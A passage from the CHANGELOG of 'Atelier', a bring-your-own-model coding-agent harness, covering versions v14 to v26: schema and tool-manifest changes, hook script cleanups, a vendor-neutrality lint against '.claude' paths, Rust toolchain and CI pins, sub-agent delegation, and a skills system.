Verified: `make install-rig` succeeds on Homebrew Python (`Successfully installed atelier-0.0.0 ... pytest-9.0.3 ...`); `make check` then runs end-to-end against `.venv/bin/python` — `50/50 artifacts validated`, `112 passed in 20.61s`, all 11 task dry-runs `OK`.

### Rig counts
- **20 schemas / 50 artifacts / 112 tests / 11 dry-runs** — unchanged from v26.

## v26 — 2026-05-16
**Toolchain bump: Rust 1.83.0 → 1.85.0.** Triggered by wiring `rmcp = { workspace = true }` into `atelier-core`; the transitive `rmcp-macros 0.1.5` requires Cargo's `edition2024` feature, which only stabilized in Rust 1.85.0. Without the bump, `cargo check -p atelier-core` fails with *"feature `edition2024` is required"*.

- **`rust-toolchain.toml`** channel → `1.85.0`.
- **Root `Cargo.toml`** `rust-version` → `1.85`.
- **`.github/workflows/check.yml`** `dtolnay/rust-toolchain@v1` toolchain input → `1.85.0`.
- **Docs synced**: `ATELIER.md`, `README.md`, `tasks/todo.md`, spec §211. Historical 1.83.0 references in earlier CHANGELOG entries are preserved as factual at-the-time records.
- **Drive-by**: `crates/atelier-gui/src/main.rs` reformatted by the 1.85 rustfmt (default function-call wrapping shifted).

Verified: `cargo check -p atelier-core` resolves `rmcp v0.1.5` clean; `cargo fmt --check`, `cargo clippy -- -D warnings`, and `cargo test -p atelier-core` (4 passed) all green.

### Rig counts
- **20 schemas / 50 artifacts / 112 tests / 11 dry-runs** — unchanged from v25.

## v25 — 2026-05-16
**Hook polish.** Two one-line cleanups to `bounded-reads.sh` flagged by the round-seven re-scan.

- **N44.** Silenced `jq`'s parse-error stderr on malformed-JSON payloads. The hook stays non-blocking per spec §15, but no longer logs `jq: parse error: Invalid numeric literal...` on every glitch payload. Added `2>/dev/null` to the first jq call and an early-exit when `tool_name` is empty or `null`.
- **N47.** Stripped `wc -l`'s left-padding from the nudge message. Before: `"Read on      889-line file without limit..."`. After: `"Read on 889-line file without limit..."`.

Verified end-to-end: malformed payload → quiet exit 0; empty stdin → quiet exit 0; legit unbounded Read still nudges (with clean formatting); Read with `limit` is silent; Grep `content` without `head_limit` still nudges.

### Rig counts
- **20 schemas / 50 artifacts / 112 tests / 11 dry-runs** — unchanged from v24.

## v24 — 2026-05-16
**Removal hygiene + audit-debt visibility.** Five follow-ups from round-six audit, plus the carry-over list promoted to a discoverable home.

### Removal hygiene — stale references swept (B21–B25)
When v21 removed `delete_file.v1.json` and v23 untracked `.atelier/settings.local.json`, several descriptions/examples/tests still pointed at them. Each fixed:
- `crates/atelier-core/tools/shell.v1.json` description: "use `write_file`/`delete_file`" → "use `write_file` or `edit_file`" (the actual spec-§15 surgical-edit tool, added in v21).
- `schemas/config/_implementation.v1.json` `builtin` description: hardcoded list of built-in tool names → pointer to spec §15 L722 (the canonical list, no future drift).
- `examples/config/permissions.v1.json`: always-deny `delete_file` example → `write_file` with the same path-pinning rationale.
- `schemas/config/permission_shapes.v1.json` examples block: `bash`/`delete_file` → `shell`/`edit_file` (real tool names from the current registry).
- `tests/test_schemas.py::test_permission_state_exact_match_shape_valid`: same swap.
- `.atelier/README.md`: directory tree no longer lists `settings.local.json` or `bin/`; symlink table is two rows, not three; settings.local.json explained as per-user gitignored state.
- `.atelier/memory/feedback_config_scope.md`: "watch for an existing settings.local.json" → "settings.local.json is per-user state managed by the host harness and gitignored."

### Doc-drift guard (Br13)
- **New test `tests/test_runner.py::test_tool_name_mentions_resolve`** — scans every bundled built-in tool manifest's `description` strings for backticked identifiers matching `*_file` / `*_dir` (the regression shape) and asserts each resolves to an actual manifest. Verified: passes clean; rejects an injected `\`frobnicate_file\`` reference; passes again after revert. Intentionally narrow — catches the original B22-class bug without false-positiving on JSON-Schema property names like `old_text`, `subagent_type`.

### Host-harness contract documented (N41)
- **New `.atelier/docs/host-harness-contract.md`** — spells out the six things a BYOM host must provide for the hooks to fire correctly: `cwd=project_root`, JSON-on-stdin, `additionalContext`-on-stdout, advisory exit codes, no required env vars, suggested time budget. Plus a 2-command smoke test a new host integrator can run to verify. Removes the "every BYOM-compatible host honors X" handwave from `.atelier/settings.json`'s comment.

### Hook script consistency (N40)
- `bounded-reads.sh` switched from `set -euo pipefail` to `set -uo pipefail` to match the other two hooks. All three now use the same discipline (no `-e`; inline `|| exit 0` for fall-through), with a comment explaining why (spec §15: hooks must never block the turn).

### Audit-debt visibility (N43)
- **`tasks/todo.md` gains a "Known smells, not blocking" section** with the ~22 carry-overs that have survived six audit rounds. Triage stance: fix opportunistically, not urgent. The build tracker is now the single source of truth for what's known-but-deferred, so future audits can re-flag selectively instead of restating the entire list.

### Rig counts
- 20 → **20 schemas** unchanged.
- **50 artifacts** unchanged.
- 111 → **112 rig tests** (+1 `test_tool_name_mentions_resolve`).

## v23 — 2026-05-16
**BYOM env-var pass + buildable rig + paranoid CI pins.** Seven follow-ups from the round-five audit, no spec changes.

### `$CLAUDE_PROJECT_DIR` removed from tracked source
The hooks previously referenced `$CLAUDE_PROJECT_DIR` — set by the host harness (Claude Code), not by Atelier. That's a vendor-coupling the BYOM directive doesn't allow. Replacement strategy:
- **Hook scripts** (`bounded-reads.sh`, `save-nudge.sh`, `session-start-memcheck.sh`) now derive `ATELIER_PROJECT_DIR` from `${BASH_SOURCE[0]}` at the top, so they work regardless of host harness or clone location.
- **`.atelier/settings.json`** hook commands switched to project-root-relative paths (`.atelier/hooks/...`). The host harness runs hook commands with `cwd=project root`, so no env var is needed at the config layer.
- `session-start-memcheck.sh` also had a hardcoded `$HOME/Projects/atelier/...` path (B13); that's gone too — the same `ATELIER_PROJECT_DIR` derivation handles it.

Net effect: `grep -r 'CLAUDE\|\\.claude' .atelier/hooks/ .atelier/settings.json` returns nothing. The BYOM lint guards against regression.

### Other follow-ups
- **B19 — `pyproject.toml` `[build-system]`** added (setuptools backend). `pip install ".[rig]"` (used by CI and `make install-rig`) needs a PEP 517 backend to be declared; the install worked on lenient pip versions but was one release away from breaking.
- **N33 — `.atelier/settings.local.json` gitignored.** Per-user permission allowlists for the host harness regenerate locally; the file no longer ships. Dropped from the BYOM lint allowlist accordingly.
- **N34 — README CHANGELOG range** updated from "v1 → v13" to a generic "spec + rig revisions" (the range was nine versions stale).
- **B20 — BYOM lint docstring** rewritten to match the code's exact-match allowlist, with each allowed entry annotated inline. No more "glob suggested, but exact-match enforced" mismatch.
- **B12 / N39 — empty `.atelier/bin/`** removed. Tools (`memcheck.sh`, `mempromote.py`, `memrecall.py`) live in `~/.atelier/bin/` per `.atelier/docs/memory-system.md`; no in-repo landing zone was actually needed.
- **Br12 — `dtolnay/rust-toolchain@v1`** pin replaces `@stable`. The `@stable` ref tracks the action's default branch; `@v1` is the semver pin the maintainer ships for reproducibility.

### Quiet hardening of the hooks
While rewriting the hooks for the BYOM pass, three extra hardenings:
- `command -v jq >/dev/null || exit 0` at the top of `bounded-reads.sh` and `save-nudge.sh` — quietly no-op on systems without `jq` instead of failing loudly with a hook-error log line.
- `bounded-reads.sh` line-counts only known-text extensions (`*.md`/`*.py`/`*.rs`/…), so a `Read` on a binary doesn't `wc -l` garbage.
- `bounded-reads.sh` uses `wc -l` instead of `awk 'END{print NR}'` — same result, smaller surface.

### Rig counts
- **20 schemas** unchanged.
- 50 → **50 artifacts** (settings.local.json untrack is JSON but it lived under `.atelier/`, not under any `JSON_RULES` glob — net zero).
- **111 rig tests** unchanged.

## v22 — 2026-05-16
**Directive lock-in: Atelier uses `.atelier/`, never `.claude/`.** No spec changes; this is enforcement of a project policy the user surfaced explicitly ("ensure that .atelier is always used instead of .claude").

### Why this is a directive, not a preference
Atelier is a BYOM (bring-your-own-model) harness. Hardcoding another vendor's directory name into tracked source quietly couples the repo to one host harness. The "Why Claude appeared in the code" table from v21 walked through each kind of reference and graded each one; this PR adds an automated guard so the policy doesn't regress.

### What's new
- **`tests/test_runner.py::test_no_claude_paths_in_tracked_source`** — lint that walks every tracked text file, skipping symlinks (which are the documented harness-shim exception: `.claude/settings.json` → `../.atelier/settings.json`; `CLAUDE.md` → `ATELIER.md`), and rejects any `.claude` or `.claudeignore` substring outside a tight allowlist. The allowlist is: `.gitignore`, `CHANGELOG.md`, `ATELIER.md`, `.atelier/README.md`, `.atelier/docs/memory-system.md`, `.atelier/memory/feedback_*.md`, `.atelier/memory/MEMORY.md`, `.atelier/settings.local.json`, `coding-harness-spec.md`, `tasks/todo.md`, and the test file itself. Each entry has a documented rationale in the test's docstring. Verified: the lint catches a fresh `.claude/foo` injection into `schemas/README.md`.
- **Project memory `.atelier/memory/feedback_atelier_path_directive.md`** — durable directive: "In atelier specifically, all project-scoped config goes under `.atelier/`. New `.claude/` paths are forbidden in tracked source." Indexed from `MEMORY.md` so future sessions pick it up.

### What is and is not a violation
*Violations* (lint-rejected): tracked source files outside the allowlist containing `.claude/`, `.claudeignore`, or `claude_code_version`-style field names. Build artefacts, symlinks pointing into `.atelier/`, and the documented historical-record files are exempt.

*Not violations*: example data using `anthropic:claude-sonnet-4-6` model strings (these are *vendor:model identifiers* in a multi-vendor BYOM list, not paths or schema fields). The routing schema's description lists six providers including `anthropic`; examples picking one for concreteness is a documentation choice, not a structural commitment.

### Rig counts
- **20 schemas** unchanged.
- **50 artifacts** unchanged.
- 110 → **111 rig tests** (+1 `test_no_claude_paths_in_tracked_source`).

## v21 — 2026-05-16
**Third audit follow-up + BYOM vendor-neutrality pass.** Seven ranked items from the v20 audit plus a sweep of Claude-specific references that crept into the schema layer. No spec changes (but several drifts *against* the spec are corrected).

### Spec-alignment fixes (drifts I introduced in v20)
- **`spawn_subagent.v1.json`** now matches spec §10.1:
  - `side_effect_class: local-risky` (was `shared-state`).
  - `subagent_type` is *optional* (defaults to `general-purpose` per spec §10.1 L515).
  - Cancellation shape (`{subagent_id, cancel: true}`) is now expressible via `input_schema.oneOf {spawn | cancel}`, including `not` constraints that reject mixed shapes.
- **Built-in tool inventory matches spec §15 L722.** Added `edit_file.v1.json` (surgical text-replace tool, atomic, fails if `old_text` is not unique unless `expected_count` is set). Removed `delete_file.v1.json` (not in spec). Final inventory: `read_file`, `write_file`, `edit_file`, `list_dir`, `grep`, `ast_grep`, `shell`, `spawn_subagent`.
- **`with_delegation.json`** `tool_fixtures.tc-1.args` now includes `prompt`, conforming to `spawn_subagent.v1.json`'s input_schema. Previously the args differed between the conversation entry and the tool_fixtures entry — replay would have lost the prompt.

### Cleanup of my own redundancies
- **t08 conftest.py removed.** The fixture's `test_transfer.py` already isolates state via `setup_function`; the conftest I added in v20 was belt-and-braces. Two layers doing the same job is worse than one — dropped the conftest.
- **`examples/tools/grep.v1.json` removed.** It defined `name: "grep"`, colliding with the built-in `crates/atelier-core/tools/grep.v1.json` shipped in v20. `examples/tools/` now contains only `web_fetch.v1.json` (a `shared-state` http example) as the demo of how to register a *custom* tool. The README is updated to point at `crates/atelier-core/tools/` for built-ins.

### CI tightening
- **CI installs from `pyproject.toml [project.optional-dependencies] rig`** via `pip install ".[rig]"`. The hand-written dep list in `check.yml` is gone — `pyproject.toml` is now the single source of truth (Makefile's `install-rig` target follows suit). Bumping a rig dep no longer needs three files updated.
- **`dtolnay/rust-toolchain@stable` + `toolchain: "1.83.0"`** input replaces `@1.83.0` ref-tag form. The action's version-shaped tags are best-effort; `@stable` is always tagged. Functionally identical but avoids a CI failure if the tag ever moves.

### BYOM vendor-neutrality (the "why is Claude in the code?" question)
The repo is a bring-your-own-model harness, but a `claude_code_version` field was hardcoded into the baselines schema — a structural commitment to one specific competitor. That's now removed:
- **`schemas/baselines/permission_prompts.v1.json`** field rename: `claude_code_version` → `baseline_harness_name` + `baseline_harness_version`. The schema is now vendor-neutral (any harness with a measurable prompt count can use these slots). The §8 calibration spec still names Claude Code as the v0.1 reference baseline, but that's a *choice* the data records, not a structural commitment of the format.
- **`compare_baselines.py`** updated to use the new field names; header line now shows whatever `baseline_harness_name` the file records (`claude-code`, `aider`, `cursor-agent`, `atelier`, etc.).
- **New test `test_baseline_byom_neutral`** runs three concrete vendor combinations (`aider+openai`, `cursor-agent+ollama`, `atelier+anthropic`) through the schema to lock in the multi-vendor contract.
- **`.gitignore` now excludes `.claude/`, `.cursor/`, `.aider/`, `.copilot/`.** Two committed files (`.claude/settings.json`, `.claude/settings.local.json`) were per-user Claude Code config that leaked into the repo. Removed and gitignored alongside other agent-harnesses' equivalents.
- **`grep.v1.json` description** previously referenced `.claudeignore` as an excluded-paths source. Updated to `.atelierignore` (with `.gitignore` as fallback) — the built-in shouldn't advertise another harness's config file.

What's intentionally left alone: example artifacts (`tests/sessions/examples/*.json`, `examples/config/routing.v1.json`, `examples/subagents/code-reviewer.v1.json`) that use `anthropic:claude-sonnet-4-6` as illustrative model strings. These are *examples* of model strings, not structural commitments — the BYOM contract says any provider-prefixed string is valid (`schemas/config/routing.v1.json` lists `anthropic`, `openai`, `litellm`, `ollama`, `mlx`, `llamacpp` in the description). Examples picking one vendor is a documentation choice, not a hardcoded dependency.

### Rig counts
- **20 schemas** unchanged.
- 51 → **50 artifacts** (+1 `edit_file.v1.json`, −1 `delete_file.v1.json`, −1 `examples/tools/grep.v1.json`; net −1).
- 109 → **110 rig tests** (+1 `test_baseline_byom_neutral`).

## v20 — 2026-05-16
**Second audit follow-up.** Six high-impact fixes from the post-v19 deep audit. No spec changes.

### Self-inflicted regression undone
- **`hook_manifest.v1.json`** — implementation `oneOf` inlined again instead of `$ref`'ing `config/_implementation.v1.json`. The shared schema carried a `timeout_ms` field intended for tools only; the v19 refactor accidentally let hooks set it, contradicting §15's "hooks never block, they only warn" contract (`time_budget_ms`). New regression test `test_hook_manifest_rejects_impl_timeout_ms` locks the contract.

### Schema coverage gaps closed
- **`crates/atelier-core/tools/spawn_subagent.v1.json`** — first authoritative schema for the `spawn_subagent` built-in tool. `input_schema` requires `{subagent_type, description, prompt}` with optional `max_turns` / `tool_allowlist` overrides. `output_schema` describes `{subagent_id, result, status, turns_used, cost?}`. `with_delegation.json` was the only prior source; that's now a conformance example, not the contract.
- **`config/_implementation.v1.json`** gained a `builtin` kind (third `oneOf` branch). Built-in tools that route to an internal handler now have a way to declare themselves; no `command` / `url` required. `tool_manifest.v1.json` `$ref`'s the shared schema and so picks this up automatically. Two new tests: `test_tool_manifest_builtin_kind_valid` and `test_tool_manifest_builtin_rejects_extra_fields`.
- **`schemas/session/v1.json`** — `cost_ledger.tool_call` entries now require `tool_name` in addition to `latency_ms`. Replay can now link a ledger entry to its `tool_fixtures` row programmatically instead of regex-parsing the free-form `note`. All four example sessions updated. New test `test_cost_ledger_tool_call_missing_tool_name_rejected`.

### Built-in tool manifests shipped
- Eight new manifests under `crates/atelier-core/tools/`: `read_file`, `write_file`, `delete_file`, `list_dir`, `grep`, `ast_grep`, `shell`, `spawn_subagent`. Each declares its `input_schema`, `output_schema`, `side_effect_class`, and `implementation: {kind: builtin}`. These resolve the dangling references in `crates/atelier-core/subagents/*.json` `tool_allowlist` (researcher cites `read_file`, `list_dir`, `grep`, `ast_grep`; test-runner cites `read_file`, `list_dir`, `grep`, `shell`) and in `examples/subagents/code-reviewer.v1.json`. `validate_artifacts.py` picks up the new directory via a new rule.

### Test-isolation footgun closed
- **`t08_add_input_validation/fixture/tests/conftest.py`** added. Snapshots and restores the module-level `transfer.ACCOUNTS` dict around every test via an autouse fixture. Confirmed: a test that mutates `ACCOUNTS["alice"]` does not leak the change to later tests. The agent's job is validation, not state-isolation plumbing.

### Dependency + CI tightening
- **`pyproject.toml`** and **`Makefile`** now declare `referencing>=0.35` explicitly (the rig's `_schema_helpers.py` imports it directly; previously it landed only as a transitive dep of `jsonschema>=4.18`).
- **`.github/workflows/check.yml`** rust job: explicit `dtolnay/rust-toolchain@1.83.0` step with `components: rustfmt, clippy` so the install happens deterministically before any cargo step. `actions/cache` key now includes `rust-toolchain.toml` so a channel bump invalidates the cache (previously only `Cargo.toml` was hashed; a toolchain bump silently reused stale `target/` artefacts).

### Rig counts
- **20 schemas** unchanged (no new schema files added; `_implementation.v1.json` grew a `builtin` branch in-place).
- 43 → **51 artifacts** (+8 built-in tool manifests under `crates/atelier-core/tools/`).
- 105 → **109 rig tests** (+4: hook timeout regression lock, tool_manifest builtin kind valid, tool_manifest builtin rejects extras, cost_ledger tool_name required).

## v19 — 2026-05-16
**Audit follow-up.** Six bug/smell/brittleness fixes from the deep audit, no spec changes.

### Bugs fixed
- **t03 `checks.json`** — `open('fixture/config.json')` → `open('config.json')`. The runner copies fixture *contents* flat into the workdir, so the prefixed path produced a spurious `FileNotFoundError` on every harness run. Latent because CI only exercises `--dry-run`. Reproduced in a fresh fixture copy before/after the fix.
- **t07 `checks.json`** callable count — replaced `grep -cE '^def …'` with an `ast.walk` count of `FunctionDef`/`AsyncFunctionDef`. The original rejected valid class-based refactors (4 methods + 1 shim → 1 top-level `def`) and rewarded dummy top-level stubs.
- **runner `run_test_command`** now takes a `timeout_s` (default 120 s); on `TimeoutExpired` returns `returncode=-1`, `timed_out=True`. `schemas/workload/runner_result.v1.json` `pytest_result` $def extended with `timed_out: boolean` and tightened to `additionalProperties: false`.

### Smells addressed
- **`.pytest_cache/` and `__pycache__/`** under `tests/workload/canonical/*/fixture/` removed (10 + 18 dirs). Gitignore patterns already matched but the dirs had been tracked.
- **`version: const 1`** is now a required top-level field on `task_meta`, `baselines/permission_prompts`, `audit/egress`, `telemetry/payload`, and `protocol/overhead`. All 11 `meta.json` artifacts updated to include `"version": 1`. `runner_result` keeps its descriptive `runner_version` name.
- **`session/v1.json` turn shape** extracted to `$defs/turn`; both `conversation` and `subagents.*.conversation` `$ref` it. ~25 lines of duplication removed.
- **`config/_implementation.v1.json`** introduced — shared shell/http `oneOf`. `tool_manifest.v1.json` and `hook_manifest.v1.json` now `$ref` it. Cross-file `$ref` resolves via the existing schema registry; affected test_schemas tests switched to `validate_with_registry`.

### Brittleness addressed
- **Rust now exercised in CI.** New `rust` job (matrix on ubuntu + macos) runs `cargo fmt --all -- --check`, `cargo clippy --workspace --all-targets -- -D warnings`, and `cargo test -p atelier-core`. Toolchain pinned via `rust-toolchain.toml` (1.83.0).
- **Harness smoke + checks lint added.** Two new pytest tests in `test_runner.py`: (a) `test_checks_commands_do_not_reference_fixture_prefix` lints all `checks.json` for the original t03 bug shape; (b) `test_runner_harness_smoke_all_tasks_emit_checks` runs the runner with `--harness-cmd true` against every canonical task and asserts each task ran at least one check with a kind.

### Rig counts
- 19 → **20 schemas** (added `config/_implementation.v1.json`).
- 102 → **105 rig tests** (added 3: meta version-required, checks-fixture-prefix lint, harness-smoke).
- 43 artifacts (unchanged; all 11 `meta.json` now carry `version: 1`).

## v18 — 2026-05-16
**Sub-agent delegation** added as a spec + schema contract. Implementation lands in Phase D/E; the contract is locked now so Phase A can scaffold against it.

### Spec §10 expansion
- §10 split into three modes:
  - **§10.1 Delegation mode (Phase D/E)** — the new headline. Parent invokes `spawn_subagent` (built-in tool); harness materialises a fresh §2.5 state machine with isolated context, optional tool allowlist, optional side-effect cap, optional routing override; sub-agent runs to completion and returns a single tool-result message. Full contract: tool input/output shape, sub-agent type system, session-state representation, interactions with §4/§7/§8/§11/§3, cancellation semantics (cascading), recursion depth cap (3, PROVISIONAL).
  - **§10.2 Comparison mode (Phase F)** — kept (same task, different routings, side-by-side).
  - **§10.3 Background critic (Phase F)** — kept.

### New schema
- **`schemas/config/subagent_type.v1.json`** — sub-agent type manifest. Required: `version`, `name`, `description`, `system_prompt_addendum`. Optional: `tool_allowlist`, `default_max_turns`, `model_routing` (via `$ref` into `routing.v1.json` — exercises the schema registry cross-reference), `side_effect_class_cap`.

### Updated schema
- **`schemas/session/v1.json`** — added optional `subagents` field. Map keyed by `subagent_id` containing per-sub-agent `parent_turn_id`, `subagent_type`, `started_at`/`finished_at`, `status` (running/completed/failed/timed_out/cancelled), `max_turns`/`turns_used`, `tool_allowlist`, full `conversation` array (with envelope `$ref`), `result` text, `cost_summary`. Existing example sessions still validate (field is optional).

### Bundled + example
- **`crates/atelier-core/subagents/researcher.json`** — read-only research sub-agent (`local-safe` cap; tool allowlist: read_file/list_dir/grep/ast_grep; 25-turn default).
- **`crates/atelier-core/subagents/test-runner.json`** — runs project tests; read + shell only; `local-risky` cap; 10-turn default.
- **`crates/atelier-core/subagents/general-purpose.json`** — catch-all; inherits parent's tool set; 30-turn default; no cap.
- **`examples/subagents/code-reviewer.v1.json`** — independent reviewer with Opus routing override + `local-safe` cap; exercises the cross-schema `$ref` to routing in practice.

### New example session
- **`tests/sessions/examples/with_delegation.json`** — full round-trip: parent invokes `spawn_subagent(researcher, ...)`, the tool-fixture captures the result, the `subagents` map records the sub-agent's complete conversation with envelope and cost summary. Locks the schema's delegation flow end-to-end.

### Rig upgrades
- `validate_artifacts.py` gains rules for `examples/subagents/*.json` and `crates/atelier-core/subagents/*.json` against the new schema.
- `test_schemas.py` gains **11 new tests** — 7 for subagent_type (minimal/full-with-routing-$ref/bad-name/missing-addendum/bad-side-effect-cap/zero-max-turns/bad-nested-routing), 4 for session.subagents (with/missing-required/bad-status/optional-when-absent).

### Final tallies
- **19 schemas / 43 artifacts / 102 rig self-tests / 11 dry-runs** — all passing.

### Documentation sweep
- Spec §10 — rewritten and expanded.
- `schemas/README.md` — row for `subagent_type.v1.json`.
- `examples/README.md` — layout + current-example entries.
- `tests/README.md` — 102-test count + new schemas/$ref listed.
- `README.md` — tally line, layout tree (adds `examples/subagents/`, `crates/atelier-core/subagents/`).
- `tasks/todo.md` — status block updated; sub-agent delegation listed as contract-locked, implementation-deferred.

## v17 — 2026-05-16
Four small consistency gaps closed; MCP catalog doubled (4 → 8 servers).

### Spec additions
- **§14 Diff blob format** — new subsection. Unified diff (`diff -u`) as the on-disk format for `<sha256>.diff` blobs. Large files (>1 MB, PROVISIONAL) bypass diff encoding and store as `<sha256>.full`. Binary files (detected by NUL byte in first 8 KB) always use `.full`. Blobs over 4 KB are zstd-compressed (`.zst`). Reconstruction by walking parent → child applying each `diff_ref`. Locks the contract Phase D §4 needs.
- **§14 Headless exit codes** — new table enumerating `--non-interactive` exit codes: 0 success, 1 verification gate failed, 2 ContextOverflowError fall-through, 3 concurrent-edit modal timeout, 4 sandbox violation, 5 model adapter unavailable, 6 envelope schema violation exhausted, 7 permission denied; 64–78 reserved for sysexits(3); 100+ tool-specific propagation. Forward-compatible — future versions add only.
- **§15 `/help` output format** — specifies the per-skill line format (`/<name>  <description>  [proactive]  <source>`), sort order (bundled → global → per-repo, alphabetical within group), override behavior (winners shown, suppressed dupes hidden), and the trailing CLI-verb summary line.

### CONTRIBUTING addition
- **Filename conventions** subsection — documents the `.v1.json` (examples) vs `.json` (bundled, runtime-overrideable) split. Reasoning: bundled artifacts carry the schema version in the *directory* (a v2 lives at `crates/atelier-core/skills_v2/`), letting short names like `/review` map cleanly to `skills/review.json`. Examples mirror schema filenames for human readability.

### MCP catalog expansion
Bundled MCP catalog grew from 4 → 8 servers. Added:
- **`memory`** — knowledge graph persistence across sessions (`local-risky`).
- **`github`** — GitHub issues/PRs/repos via PAT (`shared-state`).
- **`postgres`** — PostgreSQL query/update via connection string (`shared-state`); recommended read-only-by-default deployment.
- **`puppeteer`** — headless browser automation (`shared-state`); JavaScript-rendered web content.

All four match the existing catalog schema (`schemas/config/mcp_catalog.v1.json`); the validator already covers them.

### Rig
- No new schemas — additions ride existing validation rules.
- `make check` confirms: **18 schemas / 38 artifacts / 91 rig self-tests / 11 dry-runs** still all passing.

### Documentation sweep
- `tasks/todo.md` — bundled-catalog line updated to list all 8 servers.
- `CONTRIBUTING.md` — Filename conventions subsection.
- No other doc count changes (artifact / schema / test tallies unchanged in v17).

## v16 — 2026-05-16
OSS hygiene + MCP catalog + fork-tree example session + **Skills system**.

### Hygiene (items 1–4)
- **`SECURITY.md`** — vulnerability disclosure policy with SLOs (acknowledge ≤3 business days, initial assessment ≤10, public disclosure ≤90), in/out-of-scope rules, hardening expectations.
- **`CODE_OF_CONDUCT.md`** — Contributor Covenant 2.1, adapted.
- **`CONTRIBUTING.md`** — dev loop, conventions, PROVISIONAL discipline, PR process, license note.
- **`.github/PULL_REQUEST_TEMPLATE.md`** — structured PR template: what / where it lands / why / verification / tallies / risks / checklist.

### MCP catalog (item 5)
- **`schemas/config/mcp_catalog.v1.json`** — schema for the GUI's "Browse catalog". `oneOf` discriminates install kinds (`npm` / `binary` / `http`), optional `requires_secrets` list with `where: header | env`.
- **`crates/atelier-core/catalog/mcp_servers.json`** — bundled curated list: filesystem, git, sqlite, fetch (canonical first-party MCP servers).

### Fork-tree + recovery example session (items 6 + 7)
- **`tests/sessions/examples/with_fork_and_recovery.json`** — exercises checkpoint tree with a fork (ck-2 → main, ck-2a → alternative), `fork_label` field, a `cache_bust` ledger entry for the fork, a populated `recovery_log` entry from a hypothetical SIGKILL mid-class-implementation. Locks both schema features in one example.

### Skills system (new harness capability)
- **`schemas/config/skill_manifest.v1.json`** — schema. Required: `version`, `name`, `description`, `prompt_template`. Optional: `args` (with `required` + `default`), `pinned_context`, `tools_required`, `proactive_trigger`, `side_effect_class`.
- **Bundled skills** at `crates/atelier-core/skills/`:
  - **`/review`** — diff review (regressions / coverage / security / convention violations).
  - **`/security-review`** — security audit with `proactive_trigger` so the model suggests it when auth/credential/secret code changes.
  - **`/test`** — runs the project's test command from ATELIER.md's "Useful commands"; falls back to language defaults.
- **`/help` and `/init`** documented as harness-intercepted CLI verbs, not skill manifests — they don't reach the model.
- **Example skill** `examples/skills/explain.v1.json` exercises args (`${target}`, `${detail_level}` with default), `pinned_context`.
- **Spec §15 new subsection** describes invocation (manual `/<name>` vs proactive via `proactive_trigger`), storage layers (`~/.atelier/skills/` → `<repo>/.atelier/skills/` → bundled), substitution variables (`${arg}`, `${repo_root}`, `${atelier_md}`), and cost-ledger tracking (skill recorded as a `note` on the expanded turn's `model_call` entry).

### Rig upgrades
- `validate_artifacts.py` gains rules for `examples/skills/*.json`, `crates/atelier-core/skills/*.json`, and `crates/atelier-core/catalog/mcp_servers.json`.
- `test_schemas.py` gains **11 new tests** — 6 for skill_manifest (minimal/full/bad name/missing template/bad side-effect/bad arg name), 5 for mcp_catalog (minimal/http/npm-without-package/install-kind-mismatch/requires_secrets shape).
- New tallies: **18 schemas, 38 artifacts, 91 rig self-tests**, all passing.

### Documentation sweep
- `README.md` — tally line + layout tree updated (adds `examples/skills/`, `SECURITY.md`, `CODE_OF_CONDUCT.md`, `CONTRIBUTING.md`, `.github/PULL_REQUEST_TEMPLATE.md`, the bundled `catalog/`, `skills/`, `templates/` under `crates/atelier-core/`).
- `schemas/README.md` — rows for `skill_manifest.v1.json` and `mcp_catalog.v1.json`.
- `examples/README.md` — skill manifest row + current-example entry.
- `tests/README.md` — 91-test count + new schemas listed.
- `tasks/todo.md` — status block updated to v16 tallies.
- Spec §15 — Skills subsection inserted between Hooks and Providers.

## v15 — 2026-05-16
Decisions spec'd for the four "decided in prose, unspecified" gaps; UX and hygiene gaps closed.

### Spec decisions
- **§3 Tree-sitter grammar list.** Tier 1 (bundled in v1): Python, TypeScript/TSX, JavaScript/JSX, Rust, Go, JSON, TOML, YAML — explicit `.ext` → grammar-crate mapping. Tier 2 deferred to v0.2 (Java, C#, Ruby, C/C++, shell, markdown, HTML, CSS). Files with no matching grammar skip the syntax check; the atomic-application step still runs the conflict check + on-disk move. UI annotation `syntax-check: pass | fail | not-applicable | grammar-missing`. Bundle-size budget: ~3–5 MB, revisit if >10 MB.
- **§2.5 Streaming UI semantics.** Three named states: during-turn (`pending` envelope panels alongside streaming text + tool cards), turn-end-valid (envelope populates downstream panels), turn-end-invalid (warning bar + automatic re-prompt loop visible). Envelope is never rendered token-by-token; users never see a half-parsed `claimed_changes` array.
- **§1 `ContextOverflowError` UX.** Modal with three named options: Compact (default; runs §5 compaction, retries automatically), Reroute (switch to larger-window model from routing config), Cancel turn. Headless mode defaults to Compact → fall-through to Cancel-turn on persistent failure. Overflow events recorded as `cache_bust` ledger entries.
- **§15 MCP server discovery.** GUI's Servers panel: list with status badges, "Add server" form (transport-conditional, mirrors the schema `oneOf`), "Browse catalog" of curated MCP servers bundled at `crates/atelier-core/catalog/mcp_servers.json`. TUI keeps JSON-edit ergonomics. Remote catalog auto-fetch deferred to v0.2.

### Hygiene + project polish
- **`LICENSE`** — Apache 2.0 committed at repo root; workspace `Cargo.toml` `license = "Apache-2.0"` (was `"TBD"`). Includes patent grant (relevant for a tools project anyone might adopt commercially).
- **`.github/ISSUE_TEMPLATE/`** — `bug_report.yml` (structured form: what-happened / expected / repro / version / surface / environment / output), `feature_request.yml` (problem / proposal / alternatives / scope dropdown / priority hint), `config.yml` (disables blank issues, links to Discussions for spec/design talk).
- **CI badge** in README — links to `.github/workflows/check.yml` runs; license badge added alongside. Placeholder `OWNER` in the URL until the repo lives on GitHub.
- **README** — removed `LICENSE absent` from "intentionally absent"; added "License" + "Contributing" sections; layout tree adds `LICENSE` and `.github/ISSUE_TEMPLATE/`.

### No rig changes
v15 is purely spec + docs + project polish. The rig still reports **16 schemas / 32 artifacts / 80 rig self-tests / 11 dry-runs** — `make check` re-verified all green.

## v14 — 2026-05-16
Schema completeness pass + project-level config file (ATELIER.md).

### New schemas
- **`schemas/config/routing.v1.json`** — per-task model routing for the §1 planner/executor/critic roles. `<provider>:<model>` strings with a documented pattern that admits Ollama-style `name:tag` model IDs. Example at `examples/config/routing.v1.json`.
- **`schemas/config/permission_state.v1.json`** — persistent permission-learning state. `always_allow` / `always_deny` arrays of shape entries; three shape kinds (`argv0-and-flagset`, `path-glob`, `exact-match`) matching `schemas/config/permission_shapes.v1.json`. Per-repo `.atelier/permissions.json` overrides global `~/.atelier/permissions.json`. Example at `examples/config/permissions.v1.json`.

### Tightened existing schema
